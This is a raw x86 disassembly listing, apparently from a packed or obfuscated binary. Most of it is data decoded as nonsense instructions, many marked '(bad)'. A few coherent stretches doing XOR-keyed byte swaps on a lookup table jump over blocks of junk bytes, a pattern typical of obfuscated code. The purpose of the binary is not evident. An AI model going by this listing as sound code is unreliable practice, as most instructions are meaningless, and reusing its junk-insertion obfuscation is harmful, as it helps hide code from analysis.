  4049b7:	enter  0x33e5,0x83
  4049bb:	mov    ds:0x8705ee2f,al
  4049c0:	aaa    
  4049c1:	mov    dh,0x36
  4049c3:	sbb    bl,ch
  4049c5:	enter  0x7a56,0x45
  4049c9:	loop   0x404a0f
  4049cb:	dec    ebp
  4049cc:	pop    ebp
  4049cd:	sub    al,BYTE PTR [ebp-0x5b0b22bf]
  4049d3:	cmp    eax,DWORD PTR [eax]
  4049d5:	pop    ss
  4049d6:	jle    0x404a26
  4049d8:	ret    
  4049d9:	sbb    BYTE PTR [ecx+0x15],dl
  4049dc:	inc    edi
  4049dd:	push   esp
  4049de:	lds    esi,FWORD PTR [eax-0x51]
  4049e1:	pop    edx
  4049e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e3:	fst    QWORD PTR [edx]
  4049e5:	inc    edx
  4049e6:	inc    ebp
  4049e7:	dec    eax
  4049e8:	aad    0x8b
  4049ea:	adc    al,0xc7
  4049ec:	pop    ss
  4049ed:	jb     0x4049df
  4049ef:	ret    
  4049f0:	pushf  
  4049f1:	xor    al,0x4a
  4049f3:	imul   eax,DWORD PTR [eax+0x263dc3af],0x4b1d3526
  4049fd:	(bad)  
  4049ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a00:	call   0x92d:0xbf843e36
  404a07:	dec    edi
  404a08:	inc    esp
  404a09:	lds    ebx,FWORD PTR ds:0xc9381719
  404a0f:	sub    ch,ah
  404a11:	add    cl,bh
  404a13:	cmp    DWORD PTR [edi],ecx
  404a15:	je     0x404a6b
  404a17:	cmp    BYTE PTR [ebx],ah
  404a19:	sbb    al,0x33
  404a1b:	enter  0xa512,0x72
  404a1f:	ins    BYTE PTR es:[edi],dx
  404a20:	rol    DWORD PTR [ebp-0x82ac815],cl
  404a26:	jecxz  0x404a56
  404a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a29:	ss push 0xf
  404a2c:	and    esp,0xffffff87
  404a2f:	ficom  DWORD PTR [ecx+0x4b5a5c85]
  404a35:	and    edx,DWORD PTR [edi]
  404a37:	xor    cl,bl
  404a39:	add    eax,0xe8138f4
  404a3e:	out    dx,al
  404a3f:	fcom   st(1)
  404a41:	dec    edi
  404a42:	adc    eax,0x67a147a2
  404a47:	sub    ah,BYTE PTR [ecx+0x1cc56531]
  404a4d:	jb     0x404a2f
  404a4f:	sub    esp,eax
  404a51:	lods   eax,DWORD PTR ds:[esi]
  404a52:	jecxz  0x404a95
  404a54:	outs   dx,BYTE PTR ds:[esi]
  404a55:	icebp  
  404a56:	jge    0x4049e3
  404a58:	pusha  
  404a59:	inc    edi
  404a5a:	(bad)
  404a5e:	retf   
  404a5f:	pusha  
  404a60:	pop    edx
  404a61:	inc    eax
  404a62:	arpl   si,cx
  404a64:	fdiv   DWORD PTR [ebx+0x586229df]
  404a6a:	inc    edi
  404a6b:	cdq    
  404a6c:	enter  0x969e,0x53
  404a70:	xchg   edi,eax
  404a71:	dec    esp
  404a72:	jmp    0x404a68
  404a74:	sbb    eax,0x3b67f3f9
  404a79:	jne    0x404ac2
  404a7b:	ret    
  404a7c:	sub    eax,0xff6694c5
  404a81:	fstp   QWORD PTR [eax-0x7b]
  404a84:	and    DWORD PTR [edi],esi
  404a86:	in     eax,dx
  404a87:	les    ecx,FWORD PTR [edi+0x14]
  404a8a:	addr16 cwde 
  404a8c:	fist   WORD PTR [edx-0x40aaab67]
  404a92:	mov    ebx,0xd24965a7
  404a97:	push   0x42c24a76
  404a9c:	scas   eax,DWORD PTR es:[edi]
  404a9d:	ficomp DWORD PTR [esi-0x66]
  404aa0:	jo     0x404af1
  404aa2:	jmp    0xf445:0xc75855bb
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x8e3c6a28
  404b32:	aam    0x8f
  404b34:	cmp    DWORD PTR [edx+0x587e7e22],esp
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b77
  404b3e:	jns    0x404ae0
  404b40:	jne    0x404b17
  404b42:	add    DWORD PTR [ecx],0x2b
  404b45:	mov    ah,BYTE PTR [esi+0x6aca9358]
  404b4b:	and    DWORD PTR [ecx],0xee94f38
  404b51:	icebp  
  404b52:	inc    ecx
  404b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b54:	sub    dh,BYTE PTR [eax]
  404b56:	scas   al,BYTE PTR es:[edi]
  404b57:	and    DWORD PTR [esi],esi
  404b59:	add    al,cl
  404b5b:	leave  
  404b5c:	cld    
  404b5d:	mov    bh,0xd3
  404b5f:	popa   
  404b60:	jge    0x404b3f
  404b62:	mov    edi,0xc76aa831
  404b67:	or     al,0xda
  404b69:	aaa    
  404b6a:	mov    bh,0x6e
  404b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b6d:	es ror bl,1
  404b70:	das    
  404b71:	cmp    ecx,esi
  404b73:	in     eax,dx
  404b74:	dec    esp
  404b75:	das    
  404b76:	and    DWORD PTR [ebp-0x2c],ebx
  404b79:	in     eax,0x8f
  404b7b:	(bad)  
  404b7c:	push   esi
  404b7d:	xor    dh,BYTE PTR [edi+0x5b]
  404b80:	mov    esp,DWORD PTR [ebp+edi*2+0x7ec4ab08]
  404b87:	ret    0x54ad
  404b8a:	mov    ch,0x2
  404b8c:	jge    0x404b17
  404b8e:	in     al,dx
  404b8f:	adc    esi,eax
  404b91:	push   ss
  404b92:	out    dx,al
  404b93:	jp     0x404b38
  404b95:	xchg   edx,eax
  404b96:	js     0x404bd3
  404b98:	(bad)  
  404b99:	mov    bl,0x8b
  404b9b:	push   ebx
  404b9c:	cmp    ebx,eax
  404b9e:	pop    edi
  404b9f:	leave  
  404ba0:	xor    eax,0x95109f5a
  404ba5:	push   ecx
  404ba6:	xchg   DWORD PTR [edx],ebx
  404ba8:	and    BYTE PTR [ebx+0x2768e917],dl
  404bae:	js     0x404b96
  404bb0:	(bad)  
  404bb1:	dec    eax
  404bb2:	cmp    BYTE PTR [ebx+0x1d813166],ah
  404bb8:	pop    esi
  404bb9:	out    0x16,eax
  404bbb:	ret    
  404bbc:	xor    DWORD PTR [ebp+0x501696fc],0x27
  404bc3:	psubb  mm6,QWORD PTR [edi-0x4482f336]
  404bca:	lahf   
  404bcb:	sbb    al,0xa
  404bcd:	mov    esi,0x2799661e
  404bd2:	adc    ah,BYTE PTR [esi-0x2e]
  404bd5:	fdivr  DWORD PTR [esi-0x677cf612]
  404bdb:	push   ebp
  404bdc:	sub    edi,DWORD PTR [ebx]
  404bde:	lods   al,BYTE PTR ds:[esi]
  404bdf:	sub    ebp,DWORD PTR [edx-0x26]
  404be2:	test   al,0xfc
  404be4:	cmp    DWORD PTR [ebx-0x36],esi
  404be7:	in     al,0xc4
  404be9:	jns    0x404c2d
  404beb:	inc    ebx
  404bec:	add    al,BYTE PTR cs:[esi-0x9c0c0fb]
  404bf3:	std    
  404bf4:	lahf   
  404bf5:	lea    edx,[edi]
  404bf7:	push   0x39790e43
  404bfc:	addr16 int 0x4d
  404bff:	test   bh,dh
  404c01:	pop    esi
  404c02:	sbb    eax,0x1c8d04e1
  404c07:	dec    edi
  404c08:	xor    DWORD PTR [ecx+ecx*4-0x6e76406a],eax
  404c0f:	scas   eax,DWORD PTR es:[edi]
  404c10:	fisubr DWORD PTR [eax+0x27]
  404c13:	push   edi
  404c14:	sub    ecx,eax
  404c16:	push   ecx
  404c17:	sub    cl,0x26
  404c1a:	(bad)  
  404c1b:	cmp    eax,DWORD PTR [ebp+0x3db952c]
  404c21:	pop    es
  404c22:	pop    edx
  404c23:	(bad)  
  404c24:	jge    0x404c97
  404c26:	mov    ebx,0xa9304f04
  404c2b:	mov    cl,0x5d
  404c2d:	mov    esi,0x4c49e458
  404c32:	sub    eax,0x8f018703
  404c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c38:	add    eax,0x5852ef6a
  404c3d:	mov    edi,DWORD PTR [esi]
  404c3f:	mov    WORD PTR ss:[edi+ecx*4-0x19],?
  404c44:	push   0x2a
  404c46:	ja     0x404cba
  404c48:	fmul   QWORD PTR [edi+edi*2]
  404c4b:	call   0x7960:0x272dbf10
  404c52:	xchg   edi,eax
  404c53:	mov    ah,0xd3
  404c55:	shr    DWORD PTR [ecx-0x80],cl
  404c58:	jbe    0x404c38
  404c5a:	or     bh,BYTE PTR [ecx+eax*2]
  404c5d:	sbb    ebp,0x7aad4655
  404c63:	in     al,dx
  404c64:	repnz sbb al,0x7d
  404c67:	outs   dx,DWORD PTR ds:[esi]
  404c68:	mul    BYTE PTR [esi]
  404c6a:	in     eax,0x29
  404c6c:	pop    es
  404c6d:	jne    0x404cb2
  404c6f:	mov    ds:0x2d46bb4e,al
  404c74:	sti    
  404c75:	push   edi
  404c76:	cs xchg ecx,esp
  404c79:	cdq    
  404c7a:	fs mov gs,WORD PTR fs:[esi]
  404c7e:	jl     0x404cc4
  404c80:	test   DWORD PTR [edx],edx
  404c82:	jl     0x404cda
  404c84:	jo     0x404c75
  404c86:	sbb    al,0x27
  404c88:	inc    BYTE PTR [ebx-0x15]
  404c8b:	fnstcw WORD PTR [ebx+ebp*1]
  404c8e:	and    eax,0x157560
  404c93:	jnp    0x404ccb
  404c95:	sbb    BYTE PTR [edx+0x18],dh
  404c98:	or     al,0x48
  404c9a:	maskmovq mm7,(bad)
  404c9b:	idiv   DWORD PTR [esi+edi*2]
  404c9e:	push   ecx
  404c9f:	loopne 0x404c7d
  404ca1:	sub    ebp,edi
  404ca3:	pop    ebx
  404ca4:	inc    esi
  404ca5:	mov    esi,0xab6b5c69
  404caa:	loope  0x404c6a
  404cac:	mov    ebp,0x3ebabb3e
  404cb1:	push   es
  404cb2:	in     al,0x5c
  404cb4:	lock repnz dec ebp
  404cb7:	mov    ebx,0xe5bc91dc
  404cbc:	loope  0x404c98
  404cbe:	je     0x404c4e
  404cc0:	mov    bl,BYTE PTR [ecx]
  404cc2:	mov    ebx,0xa9bd371b
  404cc7:	xchg   ebx,eax
  404cc8:	call   0x241479d6
  404ccd:	jp     0x404c7b
  404ccf:	adc    esp,edi
  404cd1:	fstp   st(5)
  404cd3:	add    eax,DWORD PTR [eax]
  404cd5:	cmp    ah,BYTE PTR [esi]
  404cd7:	mov    esi,0xcaf6c132
  404cdc:	std    
  404cdd:	jge    0x404d28
  404cdf:	aaa    
  404ce0:	dec    edi
  404ce1:	mov    ds:0x7fb94eb9,al
  404ce6:	(bad)  
  404ce7:	(bad)  
  404ce8:	mov    eax,0xebf61290
  404ced:	test   eax,0xd0d9e4b4
  404cf2:	outs   dx,BYTE PTR ds:[esi]
  404cf3:	xor    eax,0xc4fdf706
  404cf8:	pop    ds
  404cf9:	mov    ebp,0x4ca3dc2f
  404cfe:	fisubr DWORD PTR [ebx]
  404d00:	mov    al,ds:0xacfd1127
  404d05:	adc    DWORD PTR [ecx-0x6f],0x52021986
  404d0c:	data16 daa 
  404d0e:	mov    ecx,0x7d99b008
  404d13:	ins    DWORD PTR es:[edi],dx
  404d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d15:	scas   eax,DWORD PTR es:[edi]
  404d16:	sub    BYTE PTR ds:0xec5ee345,ch
  404d1c:	xor    edx,edx
  404d1e:	(bad)  
  404d20:	into   
  404d21:	jecxz  0x404ccd
  404d23:	sbb    ch,BYTE PTR [eax+0x45a18479]
  404d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d2a:	nop
  404d2b:	inc    esi
  404d2c:	test   eax,0x6208f757
  404d31:	stos   BYTE PTR es:[edi],al
  404d32:	popa   
  404d33:	pop    ecx
  404d34:	xor    esp,DWORD PTR [esi+0x4793642c]
  404d3a:	loope  0x404cd6
  404d3c:	fldcw  WORD PTR [edi]
  404d3e:	sub    BYTE PTR [ecx],ah
  404d40:	inc    edx
  404d41:	xchg   ebp,eax
  404d42:	mov    dh,0x74
  404d44:	outs   dx,BYTE PTR ds:[esi]
  404d45:	add    BYTE PTR [esi-0x14],ch
  404d48:	jecxz  0x404d90
  404d4a:	fwait
  404d4b:	scas   al,BYTE PTR es:[edi]
  404d4c:	cs loopne 0x404da2
  404d4f:	sbb    eax,0x897f4c89
  404d54:	stos   DWORD PTR es:[edi],eax
  404d55:	test   al,0x65
  404d57:	pop    ecx
  404d58:	cmc    
  404d59:	xchg   ebx,eax
  404d5a:	test   BYTE PTR [ebp+0x2f218bdd],bl
  404d60:	cmp    eax,0xe7f929dc
  404d65:	lods   al,BYTE PTR ds:[esi]
  404d66:	rcr    DWORD PTR [edi-0x65a8d8c0],1
  404d6c:	jbe    0x404dce
  404d6e:	fistp  DWORD PTR [ecx]
  404d70:	(bad)  [eax+0x877efc6]
  404d76:	(bad)  
  404d77:	or     eax,0xb848e889
  404d7c:	sti    
  404d7d:	jne    0x404d09
  404d7f:	xchg   DWORD PTR [edi+0x522d1d88],ecx
  404d85:	xor    esp,ebx
  404d87:	js     0x404d7e
  404d89:	jb     0x404dab
  404d8b:	ror    ah,0x14
  404d8e:	push   0x6d6d4355
  404d93:	sbb    BYTE PTR ds:0xcdfc0026,dh
  404d99:	neg    DWORD PTR [edx+eax*2-0x1c6a0001]
  404da0:	(bad)  
  404da2:	and    edi,DWORD PTR ss:[ebx-0x7a]
  404da6:	jo     0x404d6d
  404da8:	test   BYTE PTR [ecx],dh
  404daa:	mov    ebp,0x40307cc4
  404daf:	dec    edx
  404db0:	rol    BYTE PTR [eax+eiz*1-0x4fc41a49],1
  404db7:	dec    ebp
  404db8:	mov    ds:0x27703f28,al
  404dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbe:	sbb    DWORD PTR [eax-0x4d],eax
  404dc1:	test   bl,ah
  404dc3:	pop    es
  404dc4:	(bad)  
  404dc5:	or     eax,0xe912a69
  404dca:	and    ah,BYTE PTR [ecx+0x0]
  404dcd:	dec    ecx
  404dce:	inc    eax
  404dcf:	mov    ecx,0x8c5adf62
  404dd4:	shl    DWORD PTR [edx],0x36
  404dd7:	aaa    
  404dd8:	pop    es
  404dd9:	cdq    
  404dda:	adc    ah,BYTE PTR [eax+0x79921a71]
  404de0:	out    dx,eax
  404de1:	sbb    bl,BYTE PTR [edi]
  404de3:	hlt    
  404de4:	sub    al,0xff
  404de6:	push   edx
  404de7:	or     eax,0x4afbe75d
  404dec:	leave  
  404ded:	dec    edx
  404dee:	pop    esp
  404def:	retf   
  404df0:	inc    ebx
  404df1:	int    0x56
  404df3:	sbb    eax,0x5ae9a264
  404df8:	test   DWORD PTR [edi+0x61],edx
  404dfb:	rcr    DWORD PTR es:[ebp-0x28],0x9c
  404e00:	aad    0xe5
  404e02:	loope  0x404e72
  404e04:	jo     0x404e27
  404e06:	xor    BYTE PTR [ebx-0x7],bl
  404e09:	out    0x34,al
  404e0b:	xchg   ecx,eax
  404e0c:	dec    ebp
  404e0d:	jo     0x404e19
  404e0f:	cmp    DWORD PTR [eax],0xa10cbf79
  404e15:	sbb    BYTE PTR [ebx-0x24],ah
  404e18:	xor    ebp,esi
  404e1a:	mov    edx,0xfb24f6f7
  404e1f:	mov    ebx,0x395b916
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e65
  404e5e:	in     eax,dx
  404e5f:	jl     0xcc85
  404e64:	jle    0x404ebe
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e0e
  404e6a:	pop    ss
  404e6b:	(bad)  
  404e6c:	cmp    dl,BYTE PTR [edx-0x4076b255]
  404e72:	cmp    bl,dl
  404e74:	ja     0x404e4f
  404e76:	xor    ah,BYTE PTR [edx+0x6b]
  404e79:	push   cs
  404e7a:	cmp    DWORD PTR [ebx+0x59af3aee],edx
  404e80:	sbb    edi,DWORD PTR [esi]
  404e82:	add    DWORD PTR [edi-0x7946139a],esp
  404e88:	mov    esi,0xba68ed73
  404e8d:	outs   dx,BYTE PTR ds:[esi]
  404e8e:	leave  
  404e8f:	mov    ebx,0x85d91575
  404e94:	mov    ds:0xc01b834d,al
  404e99:	mov    DWORD PTR [ecx-0x4e],edi
  404e9c:	dec    ecx
  404e9d:	cs jle 0x404eab
  404ea0:	xchg   esp,eax
  404ea1:	push   esi
  404ea2:	add    BYTE PTR [edx+0x8d72ba4],ah
  404ea8:	mov    ch,0x91
  404eaa:	hlt    
  404eab:	imul   BYTE PTR [ebx+0x3593033b]
  404eb1:	mov    bh,0xb8
  404eb3:	jmp    0x404eb2
  404eb5:	push   0x662dd6d8
  404eba:	and    edx,ecx
  404ebc:	jo     0x404ef0
  404ebe:	dec    esp
  404ebf:	shr    DWORD PTR [edx+0x5e],cl
  404ec2:	loopne 0x404e44
  404ec4:	mov    edi,0xc546567b
  404ec9:	test   al,0xf1
  404ecb:	dec    ecx
  404ecc:	xchg   ebx,eax
  404ecd:	mov    dl,0xfc
  404ecf:	sbb    ecx,DWORD PTR [edi-0x1f]
  404ed2:	in     al,dx
  404ed3:	cli    
  404ed4:	(bad)  
  404ed6:	popf   
  404ed7:	inc    eax
  404ed8:	test   al,0xe2
  404eda:	fwait
  404edb:	outs   dx,DWORD PTR ds:[esi]
  404edc:	jp     0x404f47
  404ede:	rcl    DWORD PTR [ecx+eax*2-0x2e6b29e3],1
  404ee5:	add    al,0x62
  404ee7:	ret    
  404ee8:	jecxz  0x404e71
  404eea:	push   ecx
  404eeb:	leave  
  404eec:	je     0x7d6cf036
  404ef2:	and    eax,ebx
  404ef4:	add    eax,0x3f26ab12
  404ef9:	fisub  WORD PTR [edi-0x40bcbc37]
  404eff:	inc    edx
  404f00:	pop    esi
  404f01:	add    ebx,DWORD PTR [esi+0x5b]
  404f04:	int    0x44
  404f06:	retf   0xf489
  404f09:	adc    esi,DWORD PTR [edi-0x4d43c612]
  404f0f:	pusha  
  404f10:	in     eax,dx
  404f11:	jo     0x404f0c
  404f13:	aad    0x9a
  404f15:	adc    DWORD PTR [edi-0x2e],0x425694a3
  404f1c:	movsx  esi,dl
  404f1f:	push   ebx
  404f20:	(bad)  
  404f21:	(bad)  
  404f22:	iret   
  404f23:	add    bh,dh
  404f25:	test   al,0x9
  404f27:	and    bl,BYTE PTR [ebx+0xd]
  404f2a:	clc    
  404f2b:	js     0x404f42
  404f2d:	push   ds
  404f2e:	jmp    0x3bd7f9a4
  404f33:	fstp   QWORD PTR cs:[edi-0x502e5c36]
  404f3a:	and    BYTE PTR [ecx],al
  404f3c:	add    al,0xd5
  404f3e:	outs   dx,BYTE PTR ds:[esi]
  404f3f:	test   al,0xfa
  404f41:	sti    
  404f42:	xchg   esi,eax
  404f43:	jl     0x404ecd
  404f45:	dec    edx
  404f46:	call   0x7145:0x350c36f3
  404f4d:	mov    BYTE PTR [esi+0x6b2468b5],bl
  404f53:	sahf   
  404f54:	out    0x36,eax
  404f56:	sub    eax,0xd0d5c6c5
  404f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f5c:	mov    ch,0x4
  404f5e:	xchg   sp,ax
  404f60:	mov    ebp,0xc351aff5
  404f65:	pop    ss
  404f66:	xchg   ebx,eax
  404f67:	lea    ebp,[eax]
  404f69:	aam    0x88
  404f6b:	stos   BYTE PTR es:[edi],al
  404f6c:	cmp    DWORD PTR ds:0x1c977b22,ecx
  404f72:	mov    dh,0x99
  404f74:	pop    ecx
  404f75:	pushf  
  404f76:	jge    0x404fac
  404f78:	and    al,0x9a
  404f7a:	mov    edi,0x97345c37
  404f7f:	lds    edi,FWORD PTR [edx+0x5813a52e]
  404f85:	push   ebp
  404f86:	sahf   
  404f87:	add    esp,eax
  404f89:	icebp  
  404f8a:	ss icebp 
  404f8c:	mov    WORD PTR [edi],es
  404f8e:	add    eax,0x7fd3a5e4
  404f93:	sub    edi,0xfc66290d
  404f99:	pop    ebx
  404f9a:	add    ebx,edi
  404f9c:	lods   al,BYTE PTR ds:[esi]
  404f9d:	sbb    BYTE PTR [ebx],ah
  404f9f:	cmp    DWORD PTR ds:0x23d4fbda,eax
  404fa5:	jmp    0x404f27
  404fa7:	es ret 0xbe56
  404fab:	sbb    ch,cl
  404fad:	ret    
  404fae:	icebp  
  404faf:	ficom  WORD PTR [edx+0x63a29531]
  404fb5:	jl     0x404f6f
  404fb7:	(bad)  
  404fb8:	mov    bl,0x8f
  404fba:	xchg   ecx,eax
  404fbb:	inc    esp
  404fbc:	lock xor al,BYTE PTR [edx-0x63]
  404fc0:	inc    eax
  404fc1:	sub    al,0xe3
  404fc3:	sbb    BYTE PTR [edx+0x148dbeaa],cl
  404fc9:	xchg   DWORD PTR [ecx-0x3c300e2b],edi
  404fcf:	add    dh,dl
  404fd1:	or     al,BYTE PTR [edi-0x33]
  404fd4:	dec    ebp
  404fd5:	arpl   ax,si
  404fd7:	in     al,dx
  404fd8:	inc    ebx
  404fd9:	adc    bh,bh
  404fdb:	dec    edi
  404fdc:	xchg   DWORD PTR [ecx-0x4f],esi
  404fdf:	add    al,0x99
  404fe1:	ins    BYTE PTR es:[edi],dx
  404fe2:	xchg   edx,eax
  404fe3:	push   ebp
  404fe4:	sbb    BYTE PTR [eax+0x6b8047fc],0x42
  404feb:	pop    ebx
  404fec:	xor    BYTE PTR [edi+0x39],dh
  404fef:	enter  0xd88a,0x95
  404ff3:	sub    DWORD PTR [edi*4+0x5e9712f5],esi
  404ffa:	setg   cl
  404ffd:	out    0x5c,al
  404fff:	pop    es
  405000:	rcl    ecx,0x87
  405003:	iret   
  405004:	jmp    0x405073
  405006:	(bad)  
  405007:	call   0xed056482
  40500c:	xor    ah,BYTE PTR [ecx-0x1c]
  40500f:	mov    cl,0xa1
  405011:	mov    ch,0x38
  405013:	dec    esp
  405014:	enter  0x1060,0x62
  405018:	aam    0x53
  40501a:	loopne 0x405036
  40501c:	jle    0x40505c
  40501e:	push   ebx
  40501f:	adc    al,0xc8
  405021:	mov    dl,0x5f
  405023:	fcomp  QWORD PTR [edx]
  405025:	add    DWORD PTR [esp+edi*2-0x9],ebx
  405029:	div    DWORD PTR ds:0x8e44bd76
  40502f:	jbe    0x405006
  405031:	jne    0x405063
  405033:	and    eax,0xded5f3aa
  405038:	xor    ch,ch
  40503a:	in     al,dx
  40503b:	mov    ah,0xc
  40503d:	pop    ds
  40503e:	inc    eax
  40503f:	jge    0x4050a0
  405041:	out    dx,al
  405042:	retf   0x236e
  405045:	cld    
  405046:	fisttp WORD PTR [esi+0x3c]
  405049:	sub    bh,BYTE PTR [esi-0x6877480c]
  40504f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405050:	lds    edi,FWORD PTR [ecx]
  405052:	jle    0x405018
  405054:	adc    esi,DWORD PTR [esi-0x765cd584]
  40505a:	sub    eax,0xf104aa25
  40505f:	popf   
  405060:	jne    0x405091
  405062:	mov    edi,0xf637fbd7
  405067:	mov    dl,0x9a
  405069:	ficomp DWORD PTR [ecx]
  40506b:	dec    edi
  40506c:	in     eax,0x5f
  40506e:	push   es
  40506f:	gs out dx,al
  405071:	daa    
  405072:	mov    edx,0xe58d008b
  405077:	mov    dh,0x42
  405079:	popf   
  40507a:	int    0xe4
  40507c:	adc    ah,0x81
  40507f:	mov    DWORD PTR [esi+0x53b74122],0xbe77da69
  405089:	test   DWORD PTR [eax-0xe],0x45df4f8
  405090:	xchg   edi,eax
  405091:	je     0x4050a9
  405093:	outs   dx,DWORD PTR ds:[esi]
  405094:	sbb    esi,ecx
  405096:	mov    BYTE PTR [esi+0x5e],dl
  405099:	mov    DWORD PTR [ebp+0x2ea7b173],ecx
  40509f:	mov    ecx,0x288b958f
  4050a4:	and    bh,BYTE PTR [edi]
  4050a6:	add    ebx,DWORD PTR [ecx]
  4050a8:	rcr    DWORD PTR [ebx+0x42],0x6d
  4050ac:	xchg   DWORD PTR [edx+0x2f5476bf],ecx
  4050b2:	push   ss
  4050b3:	xchg   esi,eax
  4050b4:	and    al,BYTE PTR [ecx+0x68]
  4050b7:	pop    esp
  4050b8:	mov    ebp,0xd2f5a2a4
  4050bd:	pop    ebp
  4050be:	cli    
  4050bf:	out    dx,al
  4050c0:	cdq    
  4050c1:	mov    bl,0x12
  4050c3:	(bad)
  4050c7:	rol    DWORD PTR [eax+ebx*8-0x3540a88e],1
  4050ce:	in     al,0x40
  4050d0:	sbb    bl,BYTE PTR [edx]
  4050d2:	sbb    eax,0xa6650aa8
  4050d7:	pop    ebx
  4050d8:	gs int 0x76
  4050db:	xchg   ecx,eax
  4050dc:	call   0x35af:0xd0c5586
  4050e3:	nop
  4050e4:	pusha  
  4050e5:	cmc    
  4050e6:	daa    
  4050e7:	je     0x40512a
  4050e9:	fcomp  QWORD PTR [ebx+0x4d]
  4050ec:	push   edx
  4050ed:	cmc    
  4050ee:	(bad)
  4050f1:	loop   0x4050aa
  4050f3:	adc    bh,BYTE PTR [ebx+0x6b66e835]
  4050f9:	xor    al,BYTE PTR [esi+0x2c]
  4050fc:	adc    DWORD PTR [ebp+0x6612db3d],edi
  405102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405103:	shld   DWORD PTR [edx+ebp*1],esi,cl
  405107:	add    eax,0x2b583548
  40510c:	dec    ebp
  40510d:	sbb    al,BYTE PTR [ebx+esi*4+0x2eea2925]
  405114:	or     al,0x99
  405116:	sbb    eax,0x3ab50183
  40511b:	cmp    BYTE PTR [esi+eax*1],al
  40511e:	repnz (bad) 
  405120:	jmp    0xc4ceed45
  405125:	dec    ebp
  405126:	mov    ?,WORD PTR [eax+0x65488459]
  40512c:	add    al,0x3c
  40512e:	jne    0x4050c1
  405130:	mov    ds:0x951c2993,eax
  405135:	jmp    0x4051b5
  405137:	not    BYTE PTR [ebp-0x53]
  40513a:	and    eax,0xe4b15a5e
  40513f:	push   ebp
  405140:	ins    DWORD PTR es:[edi],dx
  405141:	sbb    ebp,DWORD PTR [edi]
  405143:	inc    esi
  405144:	sbb    eax,0x1be75d52
  405149:	aas    
  40514a:	mov    eax,ds:0x3832d446
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	sub    BYTE PTR [edx-0x32],bh
  405174:	xchg   edx,eax
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051bb
  40517e:	data16 adc cl,ah
  405181:	retf   
  405182:	jae    0x40512e
  405184:	jle    0x405174
  405186:	adc    BYTE PTR [esi+edi*1],ch
  405189:	outs   dx,DWORD PTR ds:[esi]
  40518a:	dec    ecx
  40518b:	clc    
  40518c:	xchg   ebx,eax
  40518d:	jmp    0xc87b:0xc77b5e48
  405194:	clc    
  405195:	xchg   esi,eax
  405196:	push   ebp
  405197:	cdq    
  405198:	popa   
